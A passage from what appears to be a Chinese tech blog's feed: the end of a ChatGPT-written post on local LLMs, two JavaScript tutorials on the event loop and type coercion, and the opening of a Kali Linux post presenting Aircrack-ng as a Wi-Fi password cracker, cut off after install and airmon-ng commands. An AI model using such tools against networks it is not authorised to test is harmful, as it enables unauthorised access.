align="left">Mistral-7B-Instruct</td></tr><tr><td align="left">中文问答、小规模搜索</td><td align="left">Qwen-7B-Chat (Backup)</td></tr></tbody></table><p>如果你要写Python、C++以及写接口文档，直接用DeepSeek-Coder-6.7B答题，效果出奇场！</p><p>日常搜索，例如查详详节信息，概括新闻，直接用Mistral-7B-Instruct，较为简洁。</p><hr><h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><blockquote><p>一口气总结：<strong>安装 LM Studio → 下载 GGUF → 导入模型 → 开始聊天、写代码！</strong></p></blockquote><h1 id="注意：本文由ChatGPT生成"><a href="#注意：本文由ChatGPT生成" class="headerlink" title="注意：本文由ChatGPT生成"></a>注意：本文由ChatGPT生成</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果你用的是MacBook M1 Max，有着不错的64GB综合内存，且想在本地运行强大的开源大模型，用于日常搜索问答、代码生成，那么Mistral-7B-Instruct + DeepSeek-Coder-6.7B是相当理想的组合！本文将手把手教你，如何开始简单且享受开源</summary>
      
    
    
    
    <category term="AI" scheme="http://damao2250.com/categories/AI/"/>
    
    
    <category term="Mistral" scheme="http://damao2250.com/tags/Mistral/"/>
    
    <category term="Mistral-7B-Instruct" scheme="http://damao2250.com/tags/Mistral-7B-Instruct/"/>
    
    <category term="DeepSeek" scheme="http://damao2250.com/tags/DeepSeek/"/>
    
    <category term="DeepSeek-Coder-6.7B" scheme="http://damao2250.com/tags/DeepSeek-Coder-6-7B/"/>
    
  </entry>
  
  <entry>
    <title>关于js的事件循环机制</title>
    <link href="http://damao2250.com/2025/03/17/%E5%85%B3%E4%BA%8Ejs%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/"/>
    <id>http://damao2250.com/2025/03/17/%E5%85%B3%E4%BA%8Ejs%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/</id>
    <published>2025-03-17T09:03:31.000Z</published>
    <updated>2025-05-09T04:06:36.966Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 的事件循环机制（Event Loop）是其运行时环境中的核心概念之一，用于处理异步操作和协调代码执行顺序。掌握事件循环对于理解 JavaScript 的异步编程至关重要。</p><h3 id="JavaScript-的运行时环境"><a href="#JavaScript-的运行时环境" class="headerlink" title="JavaScript 的运行时环境"></a>JavaScript 的运行时环境</h3><p>JavaScript 是一种单线程语言，意味着它在同一时刻只能执行一个任务。然而，JavaScript 的运行时环境（如浏览器或 Node.js）提供了一些机制来支持异步操作，而事件循环正是关键机制之一。</p><h3 id="事件循环的基本概念"><a href="#事件循环的基本概念" class="headerlink" title="事件循环的基本概念"></a>事件循环的基本概念</h3><p>事件循环的核心目标是确保 JavaScript 程序能够高效地处理异步任务，同时避免阻塞主线程。它通过协调以下三个主要组件来实现这一目标：</p><ul><li><p><code>调用栈（Call Stack）</code>：用于存储当前正在执行的函数，采用 LIFO（<code>后进先出</code>）原则。</p></li><li><p><code>任务队列（Task Queue）</code>：存储待执行的异步任务。</p></li><li><p><code>事件循环（Event Loop）</code>：监控调用栈和任务队列，确保任务按顺序执行。</p></li></ul><h3 id="事件循环的工作原理"><a href="#事件循环的工作原理" class="headerlink" title="事件循环的工作原理"></a>事件循环的工作原理</h3><p>事件循环的工作原理可以概括为以下步骤：</p><ul><li><p>执行同步代码（主线程代码）。</p></li><li><p>检查调用栈是否为空：如果调用栈为空，事件循环会从任务队列中取出任务执行。</p></li><li><p>执行微任务队列中的任务（如 Promise 回调）。</p></li><li><p>执行宏任务队列中的任务（如 setTimeout 回调）。</p></li><li><p>重复上述过程，直到所有任务执行完毕。</p></li></ul><h3 id="任务的分类"><a href="#任务的分类" class="headerlink" title="任务的分类"></a>任务的分类</h3><p>在 JavaScript 中，任务主要分为两类：</p><ul><li><p><code>宏任务(Macrotask)</code>：包括 <code>setTimeout</code>、<code>setInterval</code>、<code>setImmediate</code>（Node.js）、I/O 任务、UI 渲染等。</p></li><li><p><code>微任务(Microtask)</code>：包括 <code>Promise.then</code>、<code>MutationObserver</code>、<code>process.nextTick</code>（Node.js）。</p><ul><li><p><strong>注意：Promise 本身是一个同步函数，但它的回调（then、catch、finally）是异步执行的</strong></p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Start"</span><span class="token punctuation">)</span><span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Inside Promise"</span><span class="token punctuation">)</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"Resolved"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"End"</span><span class="token punctuation">)</span><span class="token comment">// 输出:</span>StartInside PromiseEndResolved<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="宏任务与微任务的执行顺序"><a href="#宏任务与微任务的执行顺序" class="headerlink" title="宏任务与微任务的执行顺序"></a>宏任务与微任务的执行顺序</h3><p>事件循环在执行任务时，会优先处理微任务队列中的任务。具体执行顺序如下：</p><ul><li><p>执行当前宏任务（如 setTimeout 的回调）。</p></li><li><p>执行微任务队列中的所有任务（如 Promise.then）。</p></li><li><p>处理下一个宏任务，并重复以上过程。</p></li></ul><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>以下是一个示例，展示事件循环如何处理宏任务和微任务：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行过程分析</p><ul><li><p>console.log(“1”) 是同步代码，立即执行，输出 1。</p></li><li><p>setTimeout 是宏任务，回调函数被放入宏任务队列。</p></li><li><p>Promise.then 是微任务，回调函数被放入微任务队列。</p></li><li><p>console.log(“4”) 是同步代码，立即执行，输出 4。</p></li><li><p>执行微任务 console.log(“3”)，输出 3。</p></li><li><p>执行宏任务 console.log(“2”)，输出 2。</p></li></ul><p>最终输出顺序</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token number">1</span><span class="token number">4</span><span class="token number">3</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Node-js-事件循环的不同之处"><a href="#Node-js-事件循环的不同之处" class="headerlink" title="Node.js 事件循环的不同之处"></a>Node.js 事件循环的不同之处</h3><p>在 Node.js 中，事件循环与浏览器环境略有不同，特别是 process.nextTick 和 setImmediate 的处理方式：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"E"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"F"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行顺序</p><ul><li><p>同步代码：<code>A</code>、<code>F</code>。</p></li><li><p>process.nextTick（优先级最高）：<code>C</code>。</p></li><li><p>Promise.then：<code>D</code>。</p></li><li><p>宏任务队列（setTimeout、setImmediate）：</p><ul><li><p><code>setTimeout(&quot;B&quot;)</code>。</p></li><li><p><code>setImmediate(&quot;E&quot;)</code>。</p></li></ul></li></ul><p>最终输出顺序</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token constant">A</span><span class="token constant">F</span><span class="token constant">C</span><span class="token constant">D</span><span class="token constant">B</span><span class="token constant">E</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="事件循环的意义"><a href="#事件循环的意义" class="headerlink" title="事件循环的意义"></a>事件循环的意义</h3><p>事件循环机制使得 JavaScript 能够在单线程环境下高效地处理异步任务，避免了线程阻塞问题，同时保证了代码的执行顺序和逻辑的正确性。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>事件循环：协调调用栈和任务队列，确保任务按顺序执行。</p></li><li><p>宏任务和微任务：宏任务包括 setTimeout 等，微任务包括 Promise.then 等。</p></li><li><p>执行顺序：优先执行同步代码 -&gt; 执行微任务 -&gt; 执行宏任务。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JavaScript 的事件循环机制（Event Loop）是其运行时环境中的核心概念之一，用于处理异步操作和协调代码执行顺序。掌握事件循环对于理解 JavaScript 的异步编程至关重要。&lt;/p&gt;
&lt;h3 id=&quot;JavaScript-的运行时环境&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://damao2250.com/categories/JavaScript/"/>
    
    
    <category term="js" scheme="http://damao2250.com/tags/js/"/>
    
    <category term="事件循环机制" scheme="http://damao2250.com/tags/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/"/>
    
    <category term="Event Loop" scheme="http://damao2250.com/tags/Event-Loop/"/>
    
  </entry>
  
  <entry>
    <title>JS中的隐式和显式类型转换</title>
    <link href="http://damao2250.com/2025/03/05/JS%E4%B8%AD%E7%9A%84%E9%9A%90%E5%BC%8F%E5%92%8C%E6%98%BE%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
    <id>http://damao2250.com/2025/03/05/JS%E4%B8%AD%E7%9A%84%E9%9A%90%E5%BC%8F%E5%92%8C%E6%98%BE%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</id>
    <published>2025-03-05T07:23:33.000Z</published>
    <updated>2025-05-09T04:06:36.959Z</updated>
    
    <content type="html"><![CDATA[<h2 id="隐式类型转换（Type-Coercion）"><a href="#隐式类型转换（Type-Coercion）" class="headerlink" title="隐式类型转换（Type Coercion）"></a>隐式类型转换（Type Coercion）</h2><ul><li>JavaScript 在某些操作符和表达式中，会自动将字符串转换为数字：</li></ul><h3 id="1-使用算术运算符（-）"><a href="#1-使用算术运算符（-）" class="headerlink" title="1. 使用算术运算符（- * / % **）"></a>1. 使用算术运算符（- * / % **）</h3><ul><li>当字符串和数字进行 非加法 运算时，JavaScript 会尝试把字符串转换为数字：</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 8</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 20</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 5</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"2"</span> <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">// 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：加法 + 不会触发转换，而是进行字符串拼接：</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// "102"  (字符串拼接)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-比较运算符（-gt-lt-gt-lt-）"><a href="#2-比较运算符（-gt-lt-gt-lt-）" class="headerlink" title="2. 比较运算符（&gt; &lt; &gt;= &lt;=）"></a>2. 比较运算符（&gt; &lt; &gt;= &lt;=）</h3><p>当字符串与数字比较大小时，字符串会被转换为数字：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// true  ("10" 变成 10)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span> <span class="token operator">&lt;</span> <span class="token string">"12"</span><span class="token punctuation">)</span> <span class="token comment">// false (因为是字符串比较)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"5"</span> <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment">// true  ("5" 变成 5)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-一元加号"><a href="#3-一元加号" class="headerlink" title="3. 一元加号 +"></a>3. 一元加号 +</h3><ul><li>号对字符串有强制转换为数字的作用</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">"10"</span><span class="token punctuation">)</span> <span class="token comment">// 10 (字符串变数字)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">"3.14"</span><span class="token punctuation">)</span> <span class="token comment">// 3.14</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment">// 0  (空字符串变成数字 0)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">"abc"</span><span class="token punctuation">)</span> <span class="token comment">// NaN (无法转换)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-进行非严格比较"><a href="#4-进行非严格比较" class="headerlink" title="4. == 进行非严格比较"></a>4. == 进行非严格比较</h3><ul><li>非严格相等 == 会尝试转换类型</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// true (字符串 "10" 被转换成数字 10)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"0"</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token comment">// true ("0" 变成数字 0，false 也变 0)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// true (空字符串变成 0)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"  "</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// true (空格也会变 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：严格相等 === 不会发生类型转换：</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">===</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// false (不同类型)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"0"</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="显式类型转换（Explicit-Conversion）"><a href="#显式类型转换（Explicit-Conversion）" class="headerlink" title="显式类型转换（Explicit Conversion）"></a>显式类型转换（Explicit Conversion）</h2><ul><li>如果你想手动把字符串转换为数字，可以使用以下方法：</li></ul><h3 id="1-Number"><a href="#1-Number" class="headerlink" title="1. Number()"></a>1. Number()</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 10</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"3.14"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3.14</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// NaN (无法转换)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// NaN</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-parseInt-和-parseFloat"><a href="#2-parseInt-和-parseFloat" class="headerlink" title="2. parseInt() 和 parseFloat()"></a>2. parseInt() 和 parseFloat()</h3><ul><li>parseInt() 解析整数，parseFloat() 解析浮点数：</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"42px"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 42 (会忽略后面非数字部分)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token string">"3.14px"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 3.14</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// NaN (无法转换)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-（一元加号）"><a href="#3-（一元加号）" class="headerlink" title="3. +（一元加号）"></a>3. +（一元加号）</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">"123"</span><span class="token punctuation">)</span> <span class="token comment">// 123</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">"3.14"</span><span class="token punctuation">)</span> <span class="token comment">// 3.14</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// NaN</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="不会触发转换的情况"><a href="#不会触发转换的情况" class="headerlink" title="不会触发转换的情况"></a>不会触发转换的情况</h2><ul><li>有些情况下，字符串不会被转换成数字：</li></ul><h3 id="加号-拼接字符串"><a href="#加号-拼接字符串" class="headerlink" title="加号 + 拼接字符串"></a>加号 + 拼接字符串</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// "102"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello"</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">// "Hello5"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 ==="></a>严格比较 ===</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"10"</span> <span class="token operator">===</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="数组-map-处理字符串"><a href="#数组-map-处理字符串" class="headerlink" title="数组 .map() 处理字符串"></a>数组 .map() 处理字符串</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [2, 4, 6] (转换)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// ["12", "22", "32"] (字符串拼接)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>#记录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;隐式类型转换（Type-Coercion）&quot;&gt;&lt;a href=&quot;#隐式类型转换（Type-Coercion）&quot; class=&quot;headerlink&quot; title=&quot;隐式类型转换（Type Coercion）&quot;&gt;&lt;/a&gt;隐式类型转换（Type Coercion）&lt;/</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://damao2250.com/categories/JavaScript/"/>
    
    
    <category term="JS" scheme="http://damao2250.com/tags/JS/"/>
    
    <category term="类型转换" scheme="http://damao2250.com/tags/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
    
  </entry>
  
  <entry>
    <title>kali相关工具</title>
    <link href="http://damao2250.com/2025/02/20/kali%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/"/>
    <id>http://damao2250.com/2025/02/20/kali%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</id>
    <published>2025-02-20T06:32:47.000Z</published>
    <updated>2025-05-09T04:06:36.964Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wifi-相关的工具"><a href="#wifi-相关的工具" class="headerlink" title="wifi 相关的工具"></a>wifi 相关的工具</h2><h3 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h3><ul><li>Aircrack-ng 是一个强大的 Wi-Fi 网络破解工具，广泛用于渗透测试和无线网络安全评估。它支持对 WEP 和 WPA/WPA2 网络进行密码破解，主要通过分析数据包和进行字典攻击</li></ul><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul><li>在 Kali Linux 中，Aircrack-ng 通常是预安装的。如果没有安装，可以通过以下命令进行安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> aircrack-ng<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="启用无线网卡的监控模式"><a href="#启用无线网卡的监控模式" class="headerlink" title="启用无线网卡的监控模式"></a>启用无线网卡的监控模式</h4><ul><li>查看无线网卡（需要有支持 <a href="https://en.wikipedia.org/wiki/Monitor_mode">监测模式</a> 的 <a href="https://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles.html">无线网卡</a>）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airmon-ng<span aria-hidden="true" 